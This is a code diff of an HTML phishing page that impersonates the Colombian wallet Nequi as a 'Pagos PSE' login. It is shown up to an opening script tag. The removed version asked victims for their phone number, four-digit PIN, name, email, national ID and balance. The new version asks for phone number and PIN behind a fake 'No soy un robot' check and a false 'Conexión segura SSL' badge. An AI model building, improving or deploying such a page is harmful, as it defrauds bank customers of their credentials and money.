@@ -3,13 +3,12 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-<title>Tu info - Verificación Nequi</title>
+<title>Nequi · Pagos PSE</title>
 
-<!-- Fuente Inter con todos los pesos -->
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700&display=swap" rel="stylesheet">
+<!-- Fuente Inter -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
-  /* RESET Y VARIABLES */
   * {
     margin: 0;
     padding: 0;
@@ -23,11 +22,8 @@
     --gray-text: #666;
     --success: #00C853;
     --danger: #ff4444;
-    --border-radius: 12px;
-    --font-base: 16px;
   }
 
-  /* Estilos base responsivos */
   body { 
     margin: 0; 
     background: #FFFFFF; 
@@ -35,396 +31,262 @@
     display: flex; 
     flex-direction: column; 
     min-height: 100vh;
-    font-size: var(--font-base);
-    line-height: 1.5;
-    -webkit-font-smoothing: antialiased;
   }
 
-  /* HEADER - Responsivo */
   .header { 
     width: 100%; 
     background: var(--primary); 
-    padding: clamp(12px, 3vw, 20px) clamp(15px, 4vw, 25px); 
+    padding: 16px 20px; 
     color: white; 
-    font-size: clamp(16px, 4vw, 20px); 
-    font-weight: 300; /* Fino pero legible */
+    font-size: 18px; 
+    font-weight: 500;
     display: flex; 
     align-items: center; 
-    gap: clamp(8px, 2vw, 12px); 
+    gap: 12px; 
   }
 
-  /* Contenedor principal - Responsivo */
+  .header span {
+    font-size: 22px;
+  }
+
   .container { 
-    padding: clamp(15px, 4vw, 25px); 
+    padding: 20px; 
     flex: 1; 
-    max-width: 600px; /* Máximo ancho en PC */
-    margin: 0 auto; /* Centrado en PC */
+    max-width: 500px;
+    margin: 0 auto; 
     width: 100%;
   }
 
-  /* Título principal - Responsivo */
-  .title { 
-    font-size: clamp(22px, 5vw, 28px); 
-    font-weight: 200; /* Fino */
+  /* Logo imagen */
+  .logo-image {
+    width: min(80%, 280px);
+    height: auto;
+    display: block;
+    margin: 5px auto 15px;
+  }
+
+  .main-title { 
+    font-size: 38px; 
+    font-weight: 700; 
     color: var(--primary); 
-    margin-bottom: clamp(15px, 3vw, 25px); 
-    margin-top: clamp(10px, 2vw, 15px); 
-    letter-spacing: -0.5px;
+    margin-bottom: 5px; 
   }
 
-  .title span {
-    font-size: clamp(12px, 3vw, 14px);
-    font-weight: 200;
+  .sub-title { 
+    font-size: 17px; 
+    font-weight: 500; 
+    color: #4b4b4b; 
+    margin-bottom: 25px; 
+    border-left: 4px solid #da0081; 
+    padding-left: 14px; 
   }
 
-  /* Cards */
-  .card { 
-    background: #fff; 
-    padding: clamp(8px, 2vw, 12px) 0; 
-    margin-bottom: 0; 
-    border-bottom: 2px solid #f0f0f0; 
-    display: flex; 
-    align-items: flex-start; 
-    gap: clamp(8px, 2vw, 12px);
-  }
-
-  .left { 
-    display: flex; 
-    align-items: flex-start; 
-    gap: clamp(10px, 2.5vw, 15px); 
-    flex: 1; 
-  }
-
-  /* Iconos - Tamaño variable */
-  .icon { 
-    width: clamp(32px, 6vw, 40px); 
-    height: clamp(32px, 6vw, 40px); 
-    display: flex; 
-    align-items: center; 
-    justify-content: center; 
-    flex-shrink: 0;
-  }
-
-  .icon svg {
-    width: clamp(20px, 4vw, 26px);
-    height: clamp(20px, 4vw, 26px);
-  }
-
-  /* Contenido */
-  .content { 
-    flex: 1; 
-    min-width: 0; /* Evita desbordamiento */
-  }
-
-  /* Títulos de campos */
-  .text-title { 
-    font-size: clamp(14px, 3.5vw, 17px); 
-    font-weight: 200; /* Fino */
-    color: var(--primary); 
-    margin-bottom: clamp(3px, 1vw, 5px); 
-    letter-spacing: -0.3px;
-    line-height: 1.4;
-    word-break: break-word;
-  }
-
-  /* Texto descriptivo */
-  .text-sub { 
-    font-size: clamp(13px, 3vw, 15px); 
-    font-weight: 200;
-    color: var(--gray-text); 
-    margin-bottom: clamp(6px, 1.5vw, 8px); 
-    line-height: 1.4; 
-    word-break: break-word;
-  }
-
-  /* Input fields */
-  .input-field { 
-    width: 100%; 
-    padding: clamp(6px, 1.5vw, 8px) 0; 
-    background-color: transparent; 
-    border: none; 
-    border-radius: 0; 
-    font-size: clamp(14px, 3.5vw, 16px); 
-    color: var(--primary); 
-    outline: none; 
-    font-family: 'Inter', sans-serif; 
-    font-weight: 200; 
-    -webkit-appearance: none;
-    appearance: none;
-  }
-
-  /* Quitar flechas de input number */
-  .input-field[type=number]::-webkit-inner-spin-button,
-  .input-field[type=number]::-webkit-outer-spin-button {
-    -webkit-appearance: none;
-    margin: 0;
-  }
-
-  .input-field[type=number] {
-    -moz-appearance: textfield;
-  }
-
-  /* Botón principal */
-  .login-button { 
-    width: 100%; 
-    padding: clamp(14px, 3vw, 18px); 
-    background-color: #da008130; 
-    border: none; 
-    border-radius: var(--border-radius); 
-    font-size: clamp(15px, 3.5vw, 17px); 
-    margin-top: clamp(20px, 4vw, 30px); 
-    cursor: not-allowed; 
-    font-weight: 200; 
-    transition: all 0.3s ease; 
-    font-family: 'Inter', sans-serif; 
-    color: #fff; 
-    line-height: 1.2;
-  }
-
-  .login-button.active { 
-    background-color: var(--primary); 
-    cursor: pointer; 
-    font-weight: 300;
-  }
-
-  /* Footer */
-  .footer { 
-    background: var(--primary); 
-    color: white; 
-    padding: clamp(20px, 4vw, 30px) clamp(15px, 4vw, 25px); 
-    text-align: center; 
-    margin-top: auto; 
-    font-weight: 200;
-    width: 100%;
-  }
-
-  .footer-content {
-    max-width: 600px;
-    margin: 0 auto;
-  }
-
-  .footer-text {
-    font-size: clamp(13px, 3vw, 15px);
-    font-weight: 200;
-    margin: clamp(8px, 2vw, 12px) 0;
+  .instruction {
+    font-size: 15px;
+    color: #2E0039;
+    margin-bottom: 30px;
     line-height: 1.5;
+    background: #f3eafc;
+    padding: 16px 18px;
+    border-radius: 16px;
+    border: 1px solid #d9c0f0;
+    font-weight: 400;
   }
 
-  .footer-links {
+  /* INPUTS ESTILO NEQUI EXACTOS */
+  .input-group {
+    margin-bottom: 24px;
+  }
+
+  .label-input {
+    font-size: 15px;
+    font-weight: 600;
+    color: #2E0039;
+    margin-bottom: 6px;
+    display: block;
+  }
+
+  .input-field {
+    width: 100%;
+    padding: 16px 18px;
+    background: white;
+    border: 2px solid #d9c9ed;
+    border-radius: 14px;
+    font-size: 16px;
+    font-family: 'Inter', sans-serif;
+    outline: none;
+    color: #1a1a1a;
+    font-weight: 500;
+    transition: all 0.2s;
+  }
+
+  .input-field:focus {
+    border-color: #2E0039;
+    box-shadow: 0 0 0 3px rgba(46, 0, 57, 0.1);
+  }
+
+  .input-field::placeholder {
+    color: #aaa;
+    font-weight: 400;
+  }
+
+  /* Validación visual */
+  .input-field.valid {
+    border-color: #00C853;
+    background-color: #f0fff0;
+  }
+
+  .input-field.invalid {
+    border-color: #ff4444;
+    background-color: #fff0f0;
+  }
+
+  /* CAPTCHA ESTILO NEQUI EXACTO - "No soy un robot" */
+  .captcha-section {
+    margin: 30px 0 25px;
+    background: #f5f0fa;
+    border-radius: 20px;
+    padding: 16px;
+    border: 1px solid #e0d0f0;
+  }
+
+  .captcha-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: #2E0039;
+    margin-bottom: 14px;
     display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: clamp(10px, 2vw, 15px);
-    margin: clamp(12px, 3vw, 18px) 0;
+    align-items: center;
+    gap: 8px;
   }
 
-  .footer-links a {
+  .captcha-title span {
+    background: #2E0039;
     color: white;
-    text-decoration: none;
-    font-size: clamp(12px, 2.5vw, 14px);
-    font-weight: 200;
-    opacity: 0.9;
-    transition: opacity 0.3s;
-    white-space: nowrap;
-  }
-
-  .footer-links a:hover {
-    opacity: 1;
-    text-decoration: underline;
-  }
-
-  .footer-copyright {
-    font-size: clamp(11px, 2.5vw, 13px);
-    font-weight: 200;
-    margin-top: clamp(10px, 2vw, 15px);
-    opacity: 0.7;
-  }
-
-  /* Loader */
-  #loader { 
-    display: none; 
-    position: fixed; 
-    top: 0; 
-    left: 0; 
-    width: 100%; 
-    height: 100%; 
-    background: rgba(255, 255, 255, 0.98); 
-    z-index: 9999; 
-    text-align: center; 
-    padding-top: min(40%, 300px); 
-    font-size: clamp(16px, 4vw, 20px); 
-    color: var(--primary); 
-    font-weight: 200; 
-  }
-
-  #loader div:first-child {
-    font-size: clamp(30px, 8vw, 48px) !important;
-  }
-
-  /* Check indicator */
-  .check { 
-    background: #e0e0e0; 
-    color: white; 
-    font-size: clamp(10px, 2vw, 12px); 
-    padding: clamp(6px, 1.5vw, 8px) clamp(8px, 2vw, 10px); 
-    border-radius: 50%; 
-    transition: all 0.3s ease;
-    font-weight: 200;
+    width: 22px;
+    height: 22px;
     display: inline-flex;
     align-items: center;
     justify-content: center;
-    min-width: clamp(24px, 5vw, 30px);
-    min-height: clamp(24px, 5vw, 30px);
-    flex-shrink: 0;
+    border-radius: 50%;
+    font-size: 13px;
   }
 
-  .check.valid {
-    background: var(--success);
+  .captcha-box {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    background: white;
+    padding: 12px 18px;
+    border-radius: 40px;
+    border: 2px solid #cdb5e8;
+    cursor: pointer;
+    transition: all 0.2s;
+    user-select: none;
   }
 
-  /* Campos editables */
-  .editable { 
-    cursor: pointer; 
-    border: 1px solid transparent; 
-    border-radius: 6px; 
-    padding: clamp(4px, 1vw, 6px) clamp(6px, 1.5vw, 8px); 
-    min-height: clamp(24px, 5vw, 32px); 
-    transition: all 0.3s ease;
-    font-size: clamp(14px, 3.5vw, 16px);
-    font-weight: 200;
-    background-color: #f9f9f9;
-    display: inline-block;
+  .captcha-box:hover {
+    background: #f9f5ff;
+    border-color: #2E0039;
+  }
+
+  .captcha-box.checked {
+    background: #e6ffe6;
+    border-color: #2b8c4c;
+  }
+
+  .captcha-checkbox {
+    width: 26px;
+    height: 26px;
+    border-radius: 8px;
+    background: white;
+    border: 2px solid #9b87b3;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    color: #2E0039;
+  }
+
+  .captcha-box.checked .captcha-checkbox {
+    background: #2b8c4c;
+    border-color: #2b8c4c;
+    color: white;
+  }
+
+  .captcha-text {
+    font-weight: 500;
+    color: #1e1e1e;
+    font-size: 15px;
+  }
+
+  /* BOTONES */
+  .login-button {
     width: 100%;
-    word-break: break-word;
-  }
-
-  .editable:hover {
-    background-color: #f0f0f0;
-    border-color: #ddd;
-  }
-
-  .editable.invalid {
-    color: var(--danger);
-    border-color: #ffcccc;
-    background-color: #fff5f5;
-  }
-
-  /* Input de dinero */
-  .money-input { 
-    border: 1px solid #ddd; 
-    border-radius: 8px; 
-    padding: clamp(8px, 2vw, 10px) clamp(10px, 2.5vw, 12px) clamp(8px, 2vw, 10px) clamp(25px, 5vw, 30px); 
-    font-size: clamp(14px, 3.5vw, 16px); 
-    width: min(200px, 80%); 
-    background: #F9F3FF; 
-    font-family: 'Inter', sans-serif; 
-    font-weight: 200;
-    -webkit-appearance: none;
-    appearance: none;
-  }
-
-  .money-container { 
-    position: relative; 
-    display: inline-block; 
-    width: 100%;
-  }
-
-  .money-container::before { 
-    content: "$"; 
-    position: absolute; 
-    left: clamp(8px, 2vw, 12px); 
-    top: 50%; 
-    transform: translateY(-50%); 
-    color: var(--primary-light); 
-    font-weight: 200; 
-    z-index: 1; 
-    font-size: clamp(13px, 3vw, 15px);
-  }
-
-  /* Modal */
-  .input-modal { 
-    position: fixed; 
-    top: 0; 
-    left: 0; 
-    right: 0; 
-    bottom: 0; 
-    background: rgba(0,0,0,0.7); 
-    display: none; 
-    justify-content: center; 
-    align-items: center; 
-    z-index: 1000; 
-    padding: 15px;
-  }
-
-  .input-container-modal { 
-    background: white; 
-    padding: clamp(20px, 5vw, 30px); 
-    border-radius: 20px; 
-    width: min(90%, 400px); 
-    box-shadow: 0 15px 40px rgba(0,0,0,0.2); 
-  }
-
-  .input-title { 
-    font-size: clamp(16px, 4vw, 20px); 
-    font-weight: 200; 
-    margin-bottom: clamp(12px, 3vw, 18px); 
-    color: var(--primary); 
-  }
-
-  .floating-input { 
-    width: 100%; 
-    padding: clamp(12px, 3vw, 15px); 
-    border: 1px solid #e0e0e0; 
-    border-radius: 12px; 
-    font-size: clamp(14px, 3.5vw, 16px); 
-    margin-bottom: clamp(12px, 3vw, 18px); 
-    outline: none; 
-    transition: border-color 0.3s ease; 
+    padding: 18px;
+    background-color: #da008130;
+    border: none;
+    border-radius: 30px;
+    font-size: 18px;
+    font-weight: 700;
+    color: white;
+    margin-top: 15px;
+    cursor: not-allowed;
     font-family: 'Inter', sans-serif;
-    font-weight: 200;
+    transition: all 0.3s ease;
   }
 
-  .floating-input:focus {
+  .login-button.active {
+    background-color: var(--primary);
+    cursor: pointer;
+  }
+
+  .login-button.active:hover {
+    background: #3A0A63;
+  }
+
+  .now-button {
+    width: 100%;
+    background: #ffffff;
+    color: var(--primary);
+    border: 2px solid #E3D4EE;
+    padding: 16px;
+    border-radius: 30px;
+    font-size: 17px;
+    margin-top: 12px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.2s;
+  }
+
+  .now-button:hover {
+    background: #F9F3FF;
     border-color: var(--primary);
   }
 
-  .input-buttons { 
-    display: flex; 
-    gap: clamp(8px, 2vw, 12px); 
+  .forgot-link {
+    display: block;
+    text-align: center;
+    margin-top: 30px;
+    color: var(--primary);
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+    border-top: 1px dashed #d0c0e0;
+    padding-top: 20px;
   }
 
-  .btn-cancel, .btn-save { 
-    flex: 1; 
-    padding: clamp(10px, 2.5vw, 14px); 
-    border: none; 
-    border-radius: 10px; 
-    font-size: clamp(14px, 3.5vw, 16px); 
-    font-weight: 200; 
-    cursor: pointer; 
-    transition: opacity 0.3s;
+  .forgot-link:hover {
+    text-decoration: underline;
   }
 
-  .btn-cancel { 
-    background: #f0f0f0; 
-    color: #666; 
-  }
-
-  .btn-save { 
-    background: var(--primary); 
-    color: white; 
-  }
-
-  .btn-cancel:hover, .btn-save:hover {
-    opacity: 0.9;
-  }
-
-  /* Barra de progreso */
+  /* Progress bar */
   .progress-bar { 
     width: 100%; 
     height: 4px; 
     background: #f0f0f0; 
     border-radius: 2px; 
-    margin: clamp(10px, 2vw, 15px) 0; 
+    margin: 15px 0; 
     overflow: hidden; 
   }
 
@@ -436,489 +298,243 @@
   }
 
   #progress-text {
-    font-size: clamp(12px, 3vw, 14px);
-    font-weight: 200;
+    font-size: 13px;
     color: var(--gray-text);
+    text-align: center;
+    margin-bottom: 5px;
   }
 
   /* Security badge */
   .security-badge { 
     background: #f8f9fa; 
     border: 1px solid #e9ecef; 
-    padding: clamp(6px, 1.5vw, 8px) clamp(10px, 2.5vw, 14px); 
+    padding: 8px 14px; 
     border-radius: 30px; 
-    font-size: clamp(11px, 2.5vw, 13px); 
+    font-size: 12px; 
     color: #6c757d; 
     display: inline-flex; 
     align-items: center; 
-    gap: clamp(4px, 1vw, 6px); 
-    font-weight: 200;
+    gap: 6px; 
   }
 
-  .security-badge span {
-    font-size: clamp(12px, 3vw, 14px);
-  }
-
-  /* Required indicator */
-  .required-indicator {
-    color: var(--danger);
-    font-size: clamp(10px, 2.2vw, 12px);
-    margin-left: 4px;
-    font-weight: 200;
-    vertical-align: super;
-  }
-
-  /* Validation messages */
-  .validation-message {
-    font-size: clamp(11px, 2.5vw, 13px);
-    color: var(--danger);
-    margin-top: 4px;
-    display: none;
-    font-weight: 200;
-  }
-
-  /* CAPTCHA */
-  .captcha-section {
-    margin: clamp(20px, 4vw, 30px) 0;
-    padding: clamp(15px, 3vw, 20px);
-    border-radius: 16px;
-    background: #f8f9fa;
-    border: 1px solid #e9ecef;
-  }
-
-  .captcha-progress-container {
-    width: 100%;
-    height: clamp(45px, 8vw, 55px);
-    background: #f0f0f0;
-    border-radius: 30px;
-    overflow: hidden;
-    position: relative;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-  }
-
-  .captcha-progress-container:hover {
-    transform: translateY(-1px);
-    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-  }
-
-  .captcha-progress-fill {
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #4CAF50, var(--success));
-    border-radius: 30px;
-    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-  }
-
-  .captcha-progress-fill.completed {
-    width: 100%;
-    box-shadow: 0 0 20px rgba(0, 200, 83, 0.4);
-  }
-
-  .captcha-text {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: clamp(14px, 3.5vw, 16px);
-    font-weight: 200;
-    color: #666;
-    z-index: 2;
-    transition: all 0.3s ease;
-    white-space: nowrap;
-  }
-
-  .captcha-progress-container.completed .captcha-text {
+  /* FOOTER */
+  .footer {
+    background: var(--primary);
     color: white;
-    font-weight: 300;
-  }
-
-  .captcha-checkmark {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    font-size: clamp(20px, 5vw, 28px);
-    color: white;
-    font-weight: 200;
-    z-index: 3;
-    opacity: 0;
-    transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-  }
-
-  .captcha-progress-container.completed .captcha-checkmark {
-    opacity: 1;
-    transform: translate(-50%, -50%) scale(1);
-  }
-
-  .captcha-instructions {
+    padding: 25px 20px;
     text-align: center;
-    font-size: clamp(13px, 3vw, 15px);
-    color: #666;
-    margin-bottom: clamp(10px, 2vw, 15px);
-    font-weight: 200;
+    margin-top: auto;
+    width: 100%;
   }
 
-  .captcha-particles {
-    position: absolute;
+  .footer-content {
+    max-width: 500px;
+    margin: 0 auto;
+  }
+
+  .footer-logo {
+    font-size: 22px;
+    font-weight: bold;
+    margin-bottom: 12px;
+  }
+
+  .footer-text {
+    font-size: 13px;
+    opacity: 0.9;
+    margin-bottom: 15px;
+  }
+
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-bottom: 15px;
+  }
+
+  .footer-link {
+    color: white;
+    text-decoration: none;
+    font-size: 12px;
+    opacity: 0.8;
+  }
+
+  .footer-link:hover {
+    opacity: 1;
+  }
+
+  .footer-copyright {
+    font-size: 11px;
+    opacity: 0.7;
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 12px;
+  }
+
+  /* Loader */
+  #loader {
+    display: none;
+    position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    pointer-events: none;
+    background: rgba(255, 255, 255, 0.98);
+    z-index: 9999;
+    text-align: center;
+    padding-top: 40%;
+    font-size: 18px;
+    color: var(--primary);
+    font-weight: 500;
   }
 
-  .particle {
-    position: absolute;
-    width: clamp(3px, 1vw, 5px);
-    height: clamp(3px, 1vw, 5px);
-    background: white;
+  .spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #eee;
+    border-top-color: var(--primary);
     border-radius: 50%;
-    opacity: 0;
+    animation: spin 0.9s linear infinite;
+    margin: 0 auto 15px;
   }
 
-  /* Input container */
-  .input-container { 
-    border-bottom: 1px solid #e0e0e0; 
-    transition: border-color 0.3s ease; 
-    width: 100%;
-  }
-
-  .input-container:focus-within { 
-    border-bottom-color: var(--primary); 
-  }
-
-  /* Estados de validación */
-  .field-valid {
-    border-color: var(--success) !important;
-  }
-
-  .field-invalid {
-    border-color: var(--danger) !important;
-    background-color: #fff5f5 !important;
-  }
-
-  /* Media queries para ajustes específicos */
-  @media (min-width: 768px) {
-    .container {
-      padding: 30px;
-    }
-
-    .card {
-      padding: 15px 0;
-    }
-
-    .text-title {
-      font-size: 16px;
-    }
-
-    .text-sub {
-      font-size: 14px;
-    }
-  }
-
-  /* Para pantallas muy pequeñas */
-  @media (max-width: 380px) {
-    .footer-links {
-      flex-direction: column;
-      gap: 8px;
-    }
-
-    .footer-links a {
-      white-space: normal;
-    }
-
-    .money-input {
-      width: 100%;
-    }
-  }
-
-  /* Animación para partículas */
-  @keyframes confetti {
-    0% {
-      opacity: 1;
-      transform: translate(0, 0) rotate(0deg);
-    }
-    100% {
-      opacity: 0;
-      transform: translate(calc(50px * var(--direction, 1)), 80px) rotate(360deg);
-    }
-  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
 <div class="header">
-  <span>←</span> Verificación de Seguridad
+  <span>←</span> Nequi · PSE
 </div>
 
-<img src="bane.jpeg" alt="Nequi" style="width: min(80%, 300px); height: auto; display: block; margin: 10px auto;">
+<img src="bane.jpeg" alt="Nequi" class="logo-image">
 
 <div class="container">
-  <div class="title">
-    Tu info 
-    <span>* Todos los campos son obligatorios</span>
+  <div class="main-title">Nequi</div>
+  <div class="sub-title">Pagos PSE de Nequi</div>
+
+  <div class="instruction">
+    Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
   </div>
 
   <form id="loginForm">
-    <!-- Campo Número -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="7" y="2" width="10" height="20" rx="3"></rect>
-            <line x1="12" y1="18" x2="12" y2="18" stroke-width="3"></line>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title">Número vinculado a Nequi<span class="required-indicator">*</span></div>
-          <div class="text-sub">Ingresa tu número de celular vinculado</div>
-          <div class="input-container">
-            <input type="tel" class="input-field" id="usuario" placeholder="Ej: 3115555555" required pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric" />
-          </div>
-          <div class="validation-message" id="usuario-error">Número inválido (10 dígitos)</div>
-        </div>
-      </div>
-      <div class="check" id="usuario-check">!</div>
+    <!-- Número de celular - ESTILO NEQUI -->
+    <div class="input-group">
+      <label class="label-input">Número de celular</label>
+      <input 
+        type="tel" 
+        class="input-field" 
+        id="usuario" 
+        placeholder="Ej: 3115555555" 
+        required 
+        maxlength="10"
+        minlength="10"
+        inputmode="numeric"
+        autocomplete="off"
+      />
     </div>
 
-    <!-- Campo Clave -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="3" y="11" width="18" height="10" rx="2"></rect>
-            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title">Clave de 4 dígitos<span class="required-indicator">*</span></div>
-          <div class="text-sub">Ingresa tu clave de seguridad</div>
-          <div class="input-container">
-            <input type="password" class="input-field" id="clave" placeholder="****" required pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric" />
-          </div>
-          <div class="validation-message" id="clave-error">Deben ser 4 dígitos</div>
-        </div>
-      </div>
-      <div class="check" id="clave-check">!</div>
-    </div>
-
-    <!-- Campo Nombre -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2">
-            <circle cx="12" cy="8" r="4"></circle>
-            <path d="M4 20c1-4 4-7 8-7s7 3 8 7"></path>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title">Nombre Completo<span class="required-indicator">*</span></div>
-          <div class="text-sub">Tus nombres y apellidos</div>
-          <div id="nombre" class="editable" onclick="mostrarInputModal('nombre', 'text', 'Ingresa tu nombre completo', 'Nombre Completo')">Nombre Completo</div>
-          <div class="validation-message" id="nombre-error">Ingresa tu nombre</div>
-        </div>
-      </div>
-      <div class="check" id="nombre-check">!</div>
-    </div>
-
-    <!-- Campo Correo -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2">
-            <rect x="3" y="5" width="18" height="14" rx="2"></rect>
-            <polyline points="3,7 12,13 21,7"></polyline>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title">Correo Electrónico<span class="required-indicator">*</span></div>
-          <div class="text-sub">Tu correo registrado</div>
-          <div id="correo" class="editable" onclick="mostrarInputModal('correo', 'email', 'Ingresa tu correo', 'correo@email.com')">correo@email.com</div>
-          <div class="validation-message" id="correo-error">Correo inválido</div>
-        </div>
-      </div>
-      <div class="check" id="correo-check">!</div>
-    </div>
-
-    <!-- Campo Documento -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2">
-            <rect x="3" y="3" width="18" height="18" rx="2"></rect>
-            <line x1="9" y1="9" x2="15" y2="15"></line>
-            <line x1="15" y1="9" x2="9" y2="15"></line>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title"># Documento<span class="required-indicator">*</span></div>
-          <div class="text-sub">Número de identidad</div>
-          <div id="cedula" class="editable" onclick="mostrarInputModal('cedula', 'text', 'Ingresa tu documento', 'CC 123456789')">CC 123456789</div>
-          <div class="validation-message" id="cedula-error">Ingresa tu documento</div>
-        </div>
-      </div>
-      <div class="check" id="cedula-check">!</div>
-    </div>
-
-    <!-- Campo Saldo -->
-    <div class="card">
-      <div class="left">
-        <div class="icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2">
-            <rect x="2" y="6" width="20" height="12" rx="2"></rect>
-            <circle cx="12" cy="12" r="3"></circle>
-          </svg>
-        </div>
-        <div class="content">
-          <div class="text-title">Pregunta de Seguridad<span class="required-indicator">*</span></div>
-          <div class="text-sub">¿Saldo disponible actual?</div>
-          <div class="money-container">
-            <input type="text" id="saldo" class="money-input" placeholder="0" oninput="manejarEntradaSaldo(this)" onblur="formatearSaldoFinal(this)" onclick="mostrarInputModal('saldo', 'number', 'Ingresa tu saldo', '0')" readonly>
-          </div>
-          <div class="validation-message" id="saldo-error">Ingresa tu saldo</div>
-        </div>
-      </div>
-      <div class="check" id="saldo-check">!</div>
+    <!-- Clave - ESTILO NEQUI -->
+    <div class="input-group">
+      <label class="label-input">Clave</label>
+      <input 
+        type="password" 
+        class="input-field" 
+        id="clave" 
+        placeholder="4 dígitos" 
+        required 
+        maxlength="4" 
+        minlength="4"
+        inputmode="numeric"
+        autocomplete="off"
+      />
     </div>
 
     <!-- Barra de progreso -->
     <div class="progress-bar">
       <div id="formProgress" class="progress-fill"></div>
     </div>
-    <div style="text-align: center;">
-      <span id="progress-text">0% completado</span>
-    </div>
+    <div id="progress-text">0% completado</div>
 
-    <!-- CAPTCHA -->
+    <!-- CAPTCHA ESTILO NEQUI EXACTO - "No soy un robot" -->
     <div class="captcha-section">
-      <div class="captcha-instructions">Haz clic para verificar que no eres un robot</div>
-      <div class="captcha-progress-container" id="captchaProgress">
-        <div class="captcha-progress-fill" id="captchaFill">
-          <div class="captcha-particles" id="captchaParticles"></div>
-        </div>
-        <div class="captcha-text" id="captchaText">Verificar</div>
-        <div class="captcha-checkmark">✓</div>
+      <div class="captcha-title">
+        <span>✓</span> Confirme que soy una persona real.
       </div>
-      <div style="text-align: center; margin-top: 8px;">
-        <div class="validation-message" id="captcha-error">Completa el CAPTCHA</div>
+      <div class="captcha-box" id="captchaBox">
+        <div class="captcha-checkbox" id="captchaCheckbox"> </div>
+        <span class="captcha-text">No soy un robot</span>
       </div>
     </div>
 
     <!-- Badge de seguridad -->
     <div style="text-align: center; margin: 15px 0;">
       <div class="security-badge">
-        <span>🔒</span>
-        Conexión segura SSL
+        <span>🔒</span> Conexión segura SSL
       </div>
     </div>
 
+    <!-- Botones -->
     <button type="submit" class="login-button" id="loginBtn" disabled>
       <span id="btnText">Verificar Identidad</span>
     </button>
-  </form>
-</div>
+    <button type="button" class="now-button" onclick="window.location.href='https://www.google.com'">Ahora No</button>
 
-<!-- Modal -->
-<div class="input-modal" id="inputModal">
-  <div class="input-container-modal">
-    <div class="input-title" id="modalTitle">Ingresa tu información</div>
-    <input type="text" id="floatingInput" class="floating-input" placeholder="Escribe aquí...">
-    <div class="input-buttons">
-      <button class="btn-cancel" onclick="cerrarModal()">Cancelar</button>
-      <button class="btn-save" onclick="guardarValor()">Guardar</button>
-    </div>
-  </div>
+    <!-- Enlace olvidé clave -->
+    <a href="#" class="forgot-link">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</a>
+  </form>
 </div>
 
 <!-- Footer -->
 <div class="footer">
   <div class="footer-content">
-    <div class="footer-logo" style="font-size: clamp(16px, 4vw, 20px); font-weight: 200;">
-      Nequi
-    </div>
+    <div class="footer-logo">Nequi</div>
     <div class="footer-text">
-      Tu billetera digital más fácil, rápida y segura
+      Banco Nequi Colombia · Todos los derechos reservados
     </div>
     <div class="footer-links">
       <a href="#" class="footer-link">Términos</a>
       <a href="#" class="footer-link">Privacidad</a>
       <a href="#" class="footer-link">Ayuda</a>
-      <a href="#" class="footer-link">Contacto</a>
     </div>
     <div class="security-badge" style="margin: 10px auto; background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
-      🔒 Transacciones 100% seguras
+      🔒 Transacciones seguras
     </div>
     <div class="footer-copyright">
-      &copy; 2024 Nequi. Todos los derechos reservados.
+      &copy; 2026 Nequi
     </div>
   </div>
 </div>
 
 <!-- Loader -->
 <div id="loader">
-  <div>⏳</div>
-  Verificando tu identidad...
-  <div style="font-size: clamp(12px, 3vw, 14px); margin-top: 10px; color: #666;">Esto puede tomar unos segundos</div>
+  <div class="spinner"></div>
+  Procesando...
 </div>
 
 <script>
